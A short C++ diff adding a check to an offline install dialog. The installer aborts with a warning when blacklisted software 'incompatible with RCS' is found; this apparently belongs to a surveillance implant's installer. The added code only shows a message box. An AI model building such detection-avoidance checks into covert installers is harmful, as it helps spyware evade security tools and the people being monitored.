@@ -369,6 +369,14 @@ void COfflineInstallDlg::OnBnClickedOk()
 		if (curr_elem->list_index == curr_sel)
 			break;
 
+	// Non installa se e' presente software blacklisted
+	if (curr_elem->is_blacklisted) {
+		WCHAR message[1024];
+		_snwprintf_s(message, sizeof(message)/sizeof(message[0]), _TRUNCATE, L"A software incompatible with RCS is installed on this system:\r\n%s", curr_elem->bl_software);
+		MessageBox(message, L"Error", MB_ICONWARNING);
+		return;
+	}
+
 	while (p) {
 		nSelected = m_user_list.GetNextSelectedItem(p);
 		if ( (curr_user = FindUser(nSelected, users_list_head)) ) {
